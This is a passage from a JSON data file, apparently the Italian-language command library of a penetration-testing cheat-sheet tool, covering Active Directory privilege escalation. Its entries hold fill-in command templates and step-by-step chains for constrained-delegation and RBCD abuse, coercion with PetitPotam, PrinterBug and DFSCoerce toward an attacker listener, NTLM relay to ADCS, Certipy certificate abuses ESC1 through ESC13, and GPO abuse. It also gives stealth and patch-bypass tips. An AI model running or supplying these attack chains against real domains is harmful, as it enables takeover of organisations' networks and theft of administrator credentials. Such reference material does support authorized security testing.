    "subcategory": "priv-esc",
    "group": "Delegation (Constrained)",
    "description": "Un account con `msDS-AllowedToDelegateTo` può impersonare qualsiasi utente verso i servizi elencati. Con le sue credenziali si forgia un ticket come Administrator tramite S4U2Self e S4U2Proxy, ottenendo accesso al servizio. L'enumerazione si fa con `Get-DomainUser -TrustedToAuth` (o `nxc ldap --find-delegation`).",
    "note": "# Trucco /altservice\nDopo S4U2Self il ticket è legato allo SPN richiesto, ma il campo servizio non è firmato: con `-altservice cifs/<host>` (getST) o `/altservice:cifs,ldap,host` (Rubeus) lo si riscrive senza limiti. Così da uno SPN qualsiasi si ottiene `cifs/` per una shell o `ldap/` per il DCSync. Se l'account ha anche `TRUSTED_TO_AUTH_FOR_DELEGATION` (protocol transition) si possono impersonare pure utenti che non usano Kerberos.",
    "platform": "cross-platform",
    "requires": [
      "password",
      "hash"
    ],
    "protocols": [
      "kerberos"
    ],
    "tags": [
      "delegation",
      "constrained",
      "s4u"
    ],
    "template": "impacket-getST -spn '<spn>' -impersonate Administrator -dc-ip <ip> '<domain>/<user>:<password>'",
    "params": [
      {
        "key": "spn",
        "label": "SPN target",
        "placeholder": "cifs/fs.corp.local"
      },
      {
        "key": "ip",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "user",
        "label": "Service account",
        "ctx": "user",
        "placeholder": "svc_web"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "host",
        "label": "Host target (FQDN)",
        "placeholder": "fs.corp.local"
      },
      {
        "key": "hash",
        "label": "NT hash",
        "ctx": "hash",
        "placeholder": "aad3b..."
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Linux (getST)",
        "template": "# richiede un TGS per lo SPN impersonando Administrator\nimpacket-getST -spn '<spn>' -impersonate Administrator -dc-ip <ip> '<domain>/<user>:<password>'\n\n# punta la cache Kerberos al ticket appena ottenuto\nexport KRB5CCNAME='Administrator@<spn>@<domain>.ccache'\n\n# usa il ticket per aprire una shell sull'host target\nimpacket-psexec -k -no-pass <host>",
        "description": "Forgi il ticket come Administrator verso lo SPN, lo carichi e accedi al servizio."
      },
      {
        "id": "rubeus",
        "label": "Windows (Rubeus)",
        "template": ".\\Rubeus.exe s4u /user:<user> /rc4:<hash> /impersonateuser:Administrator /msdsspn:'<spn>' /ptt",
        "description": "Stessa catena S4U da Windows, con inject diretto in memoria (`/ptt`). `/aes256` al posto di `/rc4` è più stealth."
      }
    ],
    "refs": [
      {
        "label": "The Hacker Recipes — Constrained delegation",
        "url": "https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained"
      }
    ]
  },
  {
    "id": "addcomputer",
    "name": "impacket-addcomputer — crea computer (RBCD)",
    "category": "active-directory",
    "subcategory": "priv-esc",
    "group": "Delegation (RBCD)",
    "description": "Crea un computer account controllato dall'attaccante sfruttando il MachineAccountQuota, che di default consente a ogni utente di dominio di aggiungerne fino a dieci. Il nuovo account, di cui si conosce la password, è il prerequisito del Resource-Based Constrained Delegation, dove serve un principal con SPN da impersonare.",
    "note": "# Quota esaurita\n`Machine account quota exceeded` significa che i dieci slot sono già occupati. In quel caso si riusa un computer account esistente di cui si controlli la password, oppure si abbassa la quota se si hanno i diritti.",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "ldap"
    ],
    "tags": [
      "impacket",
      "maq",
      "rbcd"
    ],
    "template": "impacket-addcomputer -computer-name '<newhost>$' -computer-pass '<newpass>' -dc-ip <ip> '<domain>/<user>:<password>'",
    "params": [
      {
        "key": "newhost",
        "label": "New host",
        "placeholder": "ATK01"
      },
      {
        "key": "newpass",
        "label": "Password",
        "placeholder": "Atk01Pass!"
      },
      {
        "key": "ip",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      }
    ]
  },
  {
    "id": "rbcd-write",
    "name": "impacket-rbcd — scrivi AllowedToAct",
    "category": "active-directory",
    "subcategory": "priv-esc",
    "group": "Delegation (RBCD)",
    "description": "Scrive `msDS-AllowedToActOnBehalfOfOtherIdentity` sulla vittima, così il computer account controllato potrà impersonare chiunque verso di essa tramite `getST -impersonate`.",
    "note": "# Prerequisiti\nServe il controllo di un computer account (o MachineAccountQuota>0 per crearne uno) e GenericWrite sulla vittima. Scrivi msDS-AllowedToActOnBehalfOfOtherIdentity, poi getST -impersonate administrator ottiene un ticket come admin verso la vittima.",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "ldap"
    ],
    "tags": [
      "rbcd",
      "delegation"
    ],
    "template": "impacket-rbcd -delegate-to <target>$ -delegate-from <attacker>$ -action write <domain>/<user>:<password>",
    "params": [
      {
        "key": "target",
        "label": "Victim",
        "placeholder": "WS01"
      },
      {
        "key": "attacker",
        "label": "Owned",
        "placeholder": "ATK01"
      },
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      }
    ]
  },
  {
    "id": "coercer",
    "name": "Coercer — forza autenticazione",
    "category": "active-directory",
    "subcategory": "priv-esc",
    "group": "Coercion",
    "description": "Costringe un computer, tipicamente un domain controller, ad autenticarsi verso il listener dell'attaccante sfruttando funzioni RPC che richiamano un percorso UNC: PetitPotam (MS-EFSR), il bug dello spooler PrinterBug (MS-RPRN) o DFSCoerce (MS-DFSNM). L'autenticazione forzata va poi rilanciata in relay verso ADCS o LDAP, oppure catturata su una macchina con delega non vincolata. Con la variante `scan` si vede prima quali metodi rispondono sul target, così si evita di provarli alla cieca.",
    "note": "# Prossimo passo\nForza un computer (spesso il DC) ad autenticarsi verso di te: combinalo con un relay (ntlmrelayx verso ADCS/LDAP) o con unconstrained delegation. Se un metodo è patchato prova gli altri (PetitPotam, PrinterBug, DFSCoerce).",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "rpc",
      "smb"
    ],
    "tags": [
      "coercer",
      "petitpotam",
      "printerbug",
      "dfscoerce"
    ],
    "template": "coercer coerce -u '<user>' -p '<password>' -d '<domain>' -t <ip> -l <attacker>",
    "params": [
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "ip",
        "label": "Victim",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "attacker",
        "label": "Listener",
        "placeholder": "10.10.14.5"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Coercer (tutti i metodi)",
        "template": "coercer coerce -u '<user>' -p '<password>' -d '<domain>' -t <ip> -l <attacker>",
        "description": "Prova in sequenza tutti i metodi di coercizione noti verso il target. È la scelta comoda quando non si sa quale funziona, ma è rumorosa."
      },
      {
        "id": "scan",
        "label": "Scan (check metodi)",
        "template": "coercer scan -u '<user>' -p '<password>' -d '<domain>' -t <ip>",
        "description": "Fase di check: elenca quali funzioni RPC di coercizione rispondono sul target senza sfruttarle, così si sceglie il metodo giusto prima di agire."
      },
      {
        "id": "petitpotam",
        "label": "PetitPotam (MS-EFSR)",
        "template": "python3 PetitPotam.py -u '<user>' -p '<password>' -d '<domain>' <attacker> <ip>",
        "description": "Sfrutta EfsRpcOpenFileRaw di MS-EFSR. Sui DC senza patch KB5005413 funziona anche senza credenziali (`-u '' -p ''`). Il più affidabile verso i domain controller."
      },
      {
        "id": "printerbug",
        "label": "PrinterBug (MS-RPRN)",
        "template": "python3 printerbug.py '<domain>/<user>:<password>'@<ip> <attacker>",
        "description": "Sfrutta lo spooler di stampa (MS-RPRN), spesso attivo di default. Verifica prima che il servizio risponda con `impacket-rpcdump @<ip> | grep MS-RPRN`."
      },
      {
        "id": "dfscoerce",
        "label": "DFSCoerce (MS-DFSNM)",
        "template": "python3 dfscoerce.py -u '<user>' -p '<password>' -d '<domain>' <attacker> <ip>",
        "description": "Sfrutta MS-DFSNM (Distributed File System). Frequentemente non patchato è utile quando spooler ed EFSRPC sono chiusi. Richiede credenziali di dominio standard."
      }
    ]
  },
  {
    "id": "certipy-req",
    "name": "Certipy — richiedi cert (ESC1)",
    "category": "active-directory",
    "subcategory": "priv-esc",
    "group": "ADCS - ESC1",
    "description": "Su un template vulnerabile a ESC1 richiede un certificato indicando un SAN arbitrario con `-upn administrator@dominio`: la CA lo emette senza verificare l'identità del richiedente. Il certificato permette poi di autenticarsi come l'utente impersonato via PKINIT, ottenendone TGT e NT hash. Sui DC aggiornati (patch KB5014754 di maggio 2022) serve anche `-sid <SID_target>`, che si ricava da `certipy-ad find` o `impacket-lookupsid`, altrimenti `certipy-ad auth` fallisce.",
    "note": "# Prossimo passo\nESC1: richiedi un certificato indicando -upn administrator@dominio come SAN; la CA lo emette senza verificare. Poi certipy auth -pfx dà il TGT o l’hash NT dell’admin. Il template vulnerabile viene da certipy-find.",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "ldap",
      "rpc"
    ],
    "tags": [
      "certipy",
      "esc1"
    ],
    "template": "certipy-ad req -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -ca <ca> -template <template> -upn '<upn>'",
    "params": [
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "ip",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "ca",
        "label": "CA",
        "placeholder": "CORP-CA"
      },
      {
        "key": "template",
        "label": "Template",
        "placeholder": "ITAdmins"
      },
      {
        "key": "upn",
        "label": "SAN UPN",
        "placeholder": "administrator@corp.local"
      },
      {
        "key": "sid",
        "label": "SID target (DC patchati)",
        "placeholder": "S-1-5-21-...-500"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "ESC1",
        "template": "certipy-ad req -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -ca <ca> -template <template> -upn '<upn>'",
        "description": "Richiesta ESC1 classica. Va sui DC non ancora aggiornati alla patch di certificate binding di maggio 2022."
      },
      {
        "id": "patched",
        "label": "ESC1 (DC patchato)",
        "template": "certipy-ad req -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -ca <ca> -template <template> -upn '<upn>' -sid <sid>",
        "description": "Aggiunge il SID del target nel certificato. Obbligatorio dai DC con StrongCertificateBindingEnforcement (patch KB5014754), altrimenti `certipy-ad auth` fallisce con mismatch di mapping."
      }
    ]
  },
  {
    "id": "certipy-auth",
    "name": "Certipy — auth PKINIT",
    "category": "active-directory",
    "subcategory": "priv-esc",
    "group": "ADCS - ESC1",
    "description": "Completa la catena ADCS: dato il certificato `.pfx` ottenuto per l'utente bersaglio, esegue l'autenticazione PKINIT e restituisce un TGT valido più l'NT hash dell'utente, ricavato tramite U2U. Da lì l'hash apre il Pass-the-Hash e il TGT il Pass-the-Ticket.",
    "note": "# Errore di clock skew\nPKINIT è sensibile alla differenza di orario con il domain controller. `KRB_AP_ERR_SKEW` si risolve sincronizzando l'orologio con `ntpdate <dc>` oppure `faketime`.",
    "platform": "linux",
    "requires": [
      "cert"
    ],
    "protocols": [
      "kerberos"
    ],
    "tags": [
      "certipy",
      "pkinit"
    ],
    "template": "certipy-ad auth -pfx <pfx> -dc-ip <ip>",
    "params": [
      {
        "key": "pfx",
        "label": "PFX file",
        "placeholder": "administrator.pfx"
      },
      {
        "key": "ip",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ]
  },
  {
    "id": "certipy-esc3",
    "name": "Certipy ESC3 — Enrollment Agent",
    "category": "active-directory",
    "subcategory": "priv-esc",
    "group": "ADCS - ESC3",
    "description": "Un template con EKU Certificate Request Agent permette di emettere un certificato a nome di chiunque. Si ottiene prima il cert da agente, poi lo si usa per richiedere un cert per un utente privilegiato.",
    "note": "# Interpretazione\nIl cert agente è una delega di fatto: con -on-behalf-of chiedi un certificato di autenticazione per administrator e poi lo usi per Pass-the-Certificate.\n# Errori comuni\nIl secondo template (quello richiesto on-behalf-of) deve permettere Client Authentication, altrimenti il cert non serve per autenticarti.",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "ldap",
      "rpc"
    ],
    "tags": [
      "certipy",
      "adcs",
      "esc3"
    ],
    "template": "# 1. certificato Enrollment Agent dal template vulnerabile\ncertipy-ad req -u <user>@<domain> -p '<password>' -dc-ip <ip> -ca <ca> -template <template>\n\n# 2. cert a nome di un utente privilegiato usando il cert agente\ncertipy-ad req -u <user>@<domain> -p '<password>' -dc-ip <ip> -ca <ca> -template User -on-behalf-of '<domain>\\administrator' -pfx agent.pfx\n\n# 3. autenticati col cert ottenuto\ncertipy-ad auth -pfx administrator.pfx -dc-ip <ip>",
    "params": [
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "ip",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "ca",
        "label": "CA name",
        "placeholder": "CORP-DC-CA"
      },
      {
        "key": "template",
        "label": "Template agente",
        "placeholder": "EnrollmentAgent"
      }
    ]
  },
  {
    "id": "certipy-esc4",
    "name": "Certipy ESC4 — template ACL",
    "category": "active-directory",
    "subcategory": "priv-esc",
    "group": "ADCS - ESC4",
    "description": "Con diritti di scrittura (GenericAll, WriteDacl, WriteProperty) su un template, lo si riscrive rendendolo vulnerabile a ESC1, lo si sfrutta e infine si ripristina la configurazione originale.",
    "note": "# Interpretazione\nControllare l ACL di un template equivale a controllare la sua configurazione: lo rendi enrollee-supplies-subject e client-auth, diventando di fatto ESC1.\n# Errori comuni\nRipristina SEMPRE il template originale (-configuration) dopo lo sfruttamento: lasciarlo vulnerabile e sia rumoroso sia pericoloso. I flag del sottocomando template variano tra versioni di Certipy: verifica con -h.",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "ldap",
      "rpc"
    ],
    "tags": [
      "certipy",
      "adcs",
      "esc4",
      "acl"
    ],
    "template": "# 1. salva la config originale e rendi il template vulnerabile\ncertipy-ad template -u <user>@<domain> -p '<password>' -dc-ip <ip> -template <template> -save-old\n\n# 2. sfrutta come ESC1 (richiesta a nome di administrator)\ncertipy-ad req -u <user>@<domain> -p '<password>' -dc-ip <ip> -ca <ca> -template <template> -upn administrator@<domain>\n\n# 3. ripristina il template originale (cleanup)\ncertipy-ad template -u <user>@<domain> -p '<password>' -dc-ip <ip> -template <template> -configuration <template>.json",
    "params": [
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "ip",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "ca",
        "label": "CA name",
        "placeholder": "CORP-DC-CA"
      },
      {
        "key": "template",
        "label": "Template",
        "placeholder": "VulnTemplate"
      }
    ]
  },
  {
    "id": "ntlmrelayx-adcs",
    "name": "ntlmrelayx — relay ADCS Web (ESC8)",
    "category": "active-directory",
    "subcategory": "priv-esc",
    "group": "ADCS - ESC8",
    "description": "Rilancia l'autenticazione NTLM forzata verso l'endpoint web di ADCS su `/certsrv` e richiede un certificato a nome della vittima, che è tipicamente il computer account di un domain controller (ESC8). Il certificato ottenuto si converte poi in un TGT con certipy. Va combinato con una coercizione, per esempio via coercer, che fornisca l'autenticazione da rilanciare.",
    "note": "# Prerequisiti\nESC8: in coppia con una coercizione del DC (Coercer). Rilanci l’autenticazione del computer account verso /certsrv e ottieni un suo certificato, da cui il TGT via certipy. Controllo del DC senza crackare nulla.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http",
      "ntlm"
    ],
    "tags": [
      "impacket",
      "ntlmrelayx",
      "esc8"
    ],
    "template": "impacket-ntlmrelayx -t http://<ip>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController",
    "params": [
      {
        "key": "ip",
        "label": "ADCS",
        "ctx": "ip",
        "placeholder": "10.10.10.21"
      }
    ]
  },
  {
    "id": "certipy-esc9",
    "name": "Certipy ESC9 — no security extension",
    "category": "active-directory",
    "subcategory": "priv-esc",
    "group": "ADCS - ESC9",
    "description": "Il template non include l estensione di sicurezza (SID) nel certificato: con diritti di scrittura sulla vittima se ne cambia lo userPrincipalName sul target, si richiede il cert e la mappatura debole fa autenticare come target.",
    "note": "# Interpretazione\nSenza l estensione SID, il DC mappa il cert sullo UPN: impostando lo UPN della vittima su administrator, il cert emesso vale come administrator.\n# Errori comuni\nRipristina lo UPN originale della vittima dopo. Funziona solo con StrongCertificateBindingEnforcement non impostato a 2 (mappatura forte).",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "ldap",
      "rpc"
    ],
    "tags": [
      "certipy",
      "adcs",
      "esc9"
    ],
    "template": "# 1. imposta lo UPN della vittima = account target (serve GenericWrite sulla vittima)\ncertipy-ad account update -u <user>@<domain> -p '<password>' -dc-ip <ip> -user <victim> -upn administrator\n\n# 2. richiedi il certificato come vittima\ncertipy-ad req -u <victim>@<domain> -p '<victimpass>' -dc-ip <ip> -ca <ca> -template <template>\n\n# 3. ripristina lo UPN della vittima\ncertipy-ad account update -u <user>@<domain> -p '<password>' -dc-ip <ip> -user <victim> -upn <victim>@<domain>\n\n# 4. autenticati: il cert mappa su administrator\ncertipy-ad auth -pfx administrator.pfx -dc-ip <ip>",
    "params": [
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "ip",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "victim",
        "label": "Account vittima",
        "placeholder": "svc_web"
      },
      {
        "key": "victimpass",
        "label": "Password vittima",
        "placeholder": "Summer2025"
      },
      {
        "key": "ca",
        "label": "CA name",
        "placeholder": "CORP-DC-CA"
      },
      {
        "key": "template",
        "label": "Template",
        "placeholder": "ESC9Template"
      }
    ]
  },
  {
    "id": "certipy-esc13",
    "name": "Certipy ESC13 — issuance policy legata a gruppo",
    "category": "active-directory",
    "subcategory": "priv-esc",
    "group": "ADCS - ESC13",
    "description": "Il template ha una issuance policy (OID) collegata a un gruppo privilegiato tramite msDS-OIDToGroupLink. Un certificato emesso da quel template concede l appartenenza al gruppo in fase di autenticazione.",
    "note": "# Interpretazione\nNon serve manomettere nulla: basta avere l enrollment sul template. Il token Kerberos ottenuto col cert include il gruppo collegato all OID.\n# Errori comuni\nConta il gruppo collegato all OID, non il nome del template: verifica il link con Certipy find prima di richiedere.",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "ldap",
      "kerberos"
    ],
    "tags": [
      "certipy",
      "adcs",
      "esc13"
    ],
    "template": "# richiedi il cert dal template con issuance policy legata a un gruppo\ncertipy-ad req -u <user>@<domain> -p '<password>' -dc-ip <ip> -ca <ca> -template <template>\n\n# autenticati: ottieni l appartenenza al gruppo collegato\ncertipy-ad auth -pfx <user>.pfx -dc-ip <ip>",
    "params": [
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "ip",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "ca",
        "label": "CA name",
        "placeholder": "CORP-DC-CA"
      },
      {
        "key": "template",
        "label": "Template",
        "placeholder": "ESC13Template"
      }
    ]
  },
  {
    "id": "certipy-esc",
    "name": "Certipy — ESC2/3/4/6/7/9/10/13",
    "category": "active-directory",
    "subcategory": "priv-esc",
    "group": "ADCS - altri ESC",
    "description": "Raccoglie gli abusi ADCS oltre a ESC1/ESC8, uno per variante. Ogni misconfigurazione è una scorciatoia diversa verso un certificato di Administrator: ESC2/ESC3 sfruttano EKU permissivi, ESC4 i diritti di scrittura sul template, ESC6 un flag della CA, ESC7 il ruolo Manage CA, ESC9/ESC10 la manipolazione dell'UPN della vittima, ESC13 una issuance policy legata a un gruppo. Prima individua quale con `certipy-ad find -vulnerable`, poi scegli la variante corrispondente.",
    "note": "# Quale variante usare\nGli abusi oltre ESC1/ESC8: ESC3 (Enrollment Agent), ESC4 (template scrivibile: rendilo vulnerabile e sfruttalo), ESC9 (no security extension), ESC13 (OID legato a gruppo). Certipy-find dice quale si applica: scegli la sotto-tecnica.",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "ldap",
      "rpc"
    ],
    "tags": [
      "certipy",
      "adcs",
      "esc2",
      "esc3",
      "esc4",
      "esc6",
      "esc7",
      "esc9",
      "esc10",
      "esc13"
    ],
    "template": "certipy-ad template -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -template <template> -save-old",
    "params": [
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "ip",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "ca",
        "label": "CA",
        "placeholder": "CORP-CA"
      },
      {
        "key": "template",
        "label": "Template",
        "placeholder": "VulnTemplate"
      },
      {
        "key": "id",
        "label": "Request ID",
        "placeholder": "12"
      },
      {
        "key": "target",
        "label": "Account vittima (ESC9/10)",
        "placeholder": "svc_victim"
      },
      {
        "key": "newpass",
        "label": "Nuova password vittima",
        "placeholder": "NewP@ss123!"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "ESC4 (write template)",
        "template": "# salva la configurazione attuale del template, da ripristinare dopo\ncertipy-ad template -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -template <template> -save-old\n\n# rende il template vulnerabile: l'enrollee fornisce il subject\ncertipy-ad template -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -template <template>\n\n# richiede un certificato come Administrator sfruttando il template\ncertipy-ad req -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -ca <ca> -template <template> -upn Administrator@<domain>\n\n# cleanup obbligatorio: rimette il template come l'hai trovato\ncertipy-ad template -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -template <template> -configuration <template>.json",
        "description": "Salvi la config, riscrivi il template come ESC1, richiedi il cert come Administrator, poi ripristini l'originale."
      },
      {
        "id": "esc7",
        "label": "ESC7 (Manage CA)",
        "template": "# ti aggiunge come officer della CA\ncertipy-ad ca -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -ca <ca> -add-officer <user>\n\n# riabilita il template SubCA sulla CA\ncertipy-ad ca -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -ca <ca> -enable-template SubCA\n\n# richiede un certificato per Administrator: resta in pending\ncertipy-ad req -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -ca <ca> -template SubCA -upn Administrator@<domain>\n\n# come officer, approvi la tua stessa richiesta\ncertipy-ad ca -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -ca <ca> -issue-request <id>\n\n# scarica il certificato emesso\ncertipy-ad req -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -ca <ca> -retrieve <id>",
        "description": "Aggiunge l'account come Officer, abilita SubCA, invia la richiesta che resta in pending, la emette sfruttando il ruolo di Officer e infine recupera il certificato."
      },
      {
        "id": "esc2",
        "label": "ESC2 (Any Purpose)",
        "template": "# richiede un certificato Any Purpose impersonando administrator\ncertipy-ad req -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -ca <ca> -template <template> -upn administrator@<domain>\n\n# autentica con il PFX e recupera l'hash NT\ncertipy-ad auth -pfx administrator.pfx -dc-ip <ip>",
        "description": "Template con EKU «Any Purpose» o senza EKU: il certificato vale per qualunque scopo, Client Authentication compresa. Si richiede come in ESC1 mettendo l'UPN di Administrator nel SAN."
      },
      {
        "id": "esc3",
        "label": "ESC3 (Enrollment Agent)",
        "template": "# richiede il certificato Enrollment Agent\ncertipy-ad req -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -ca <ca> -template <template>\n\n# con quel cert, emette un certificato «per conto di» administrator\ncertipy-ad req -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -ca <ca> -template User -on-behalf-of '<domain>\\administrator' -pfx <user>.pfx\n\n# autentica con il PFX ottenuto\ncertipy-ad auth -pfx administrator.pfx -dc-ip <ip>",
        "description": "Il template ha l'EKU Certificate Request Agent. Si ottiene prima un cert da Enrollment Agent, poi lo si usa per richiedere un certificato on-behalf-of Administrator su un template di enrollment normale."
      },
      {
        "id": "esc6",
        "label": "ESC6 (CA flag SAN)",
        "template": "# con EDITF_ATTRIBUTESUBJECTALTNAME2 attivo, l'UPN lo scegli tu\ncertipy-ad req -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -ca <ca> -template User -upn administrator@<domain>\n\n# autentica con il PFX e recupera l'hash NT\ncertipy-ad auth -pfx administrator.pfx -dc-ip <ip>",
        "description": "La CA ha il flag EDITF_ATTRIBUTESUBJECTALTNAME2 attivo: accetta un SAN arbitrario su qualsiasi template con autenticazione, anche uno standard come User. Stesso effetto di ESC1 senza bisogno di un template vulnerabile."
      },
      {
        "id": "esc9",
        "label": "ESC9 (no security extension)",
        "template": "# serve GenericWrite o ForceChangePassword sul target, più un template senza msDS-SecurityExtension\n\n# imposta l'UPN della vittima su 'administrator', senza dominio\ncertipy-ad account update -u '<user>@<domain>' -p '<password>' -user <target> -upn administrator -dc-ip <ip>\n\n# richiede il certificato impersonando la vittima\ncertipy-ad req -u '<target>@<domain>' -p '<newpass>' -ca <ca> -template <template> -dc-ip <ip>\n\n# ripristina l'UPN originale della vittima\ncertipy-ad account update -u '<user>@<domain>' -p '<password>' -user <target> -upn '<target>@<domain>' -dc-ip <ip>\n\n# autentica con il certificato e recupera l'hash NT\ncertipy-ad auth -pfx administrator.pfx -domain <domain> -dc-ip <ip>",
        "description": "Template senza Security Extension: il certificato viene mappato per UPN e non per SID. Si cambia temporaneamente l'UPN della vittima in `administrator`, si emette il cert a suo nome e all'auth il DC lo mappa sull'Administrator reale. Ripristinare sempre l'UPN."
      },
      {
        "id": "esc10",
        "label": "ESC10 (weak cert mapping)",
        "template": "# DC con StrongCertificateBinding in Compatibility o Disabled: mapping debole\n\n# imposta l'UPN della vittima su 'administrator', senza dominio\ncertipy-ad account update -u '<user>@<domain>' -p '<password>' -user <target> -upn administrator -dc-ip <ip>\n\n# richiede il certificato impersonando la vittima\ncertipy-ad req -u '<target>@<domain>' -p '<newpass>' -ca <ca> -template <template> -dc-ip <ip>\n\n# ripristina l'UPN originale della vittima\ncertipy-ad account update -u '<user>@<domain>' -p '<password>' -user <target> -upn '<target>@<domain>' -dc-ip <ip>\n\n# autentica con il certificato e recupera l'hash NT\ncertipy-ad auth -pfx administrator.pfx -domain <domain> -dc-ip <ip>",
        "description": "Mappatura certificato debole lato DC (chiave CertificateMappingMethods o binding non forzato). Si sfrutta come ESC9 manipolando l'UPN della vittima: utile quando il template non è ESC9 ma il DC accetta comunque il mapping debole."
      },
      {
        "id": "esc13",
        "label": "ESC13 (issuance policy, gruppo)",
        "template": "# template con issuance policy il cui OID è legato a un gruppo privilegiato (msDS-OIDToGroupLink)\n\n# richiede il certificato dal template con la policy\ncertipy-ad req -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -ca <ca> -template <template>\n\n# autentica: il certificato porta con sé l'appartenenza al gruppo\ncertipy-ad auth -pfx <user>.pfx -dc-ip <ip>",
        "description": "Il template ha una issuance policy con OID collegato a un gruppo (msDS-OIDToGroupLink). Il TGT ottenuto col certificato eredita la SID di quel gruppo: si diventa membro effettivo di un gruppo privilegiato senza modificarne l'appartenenza."
      }
    ]
  },
  {
    "id": "gpo-abuse",
    "name": "SharpGPOAbuse — abusa GPO",
    "category": "active-directory",
    "subcategory": "priv-esc",
    "group": "GPO Abuse",
    "description": "I diritti di scrittura su una GPO permettono di aggiungere l'account come amministratore locale su tutte le macchine nel suo scope, oppure di piazzare uno scheduled task come SYSTEM. Serve poi un `gpupdate /force`.",
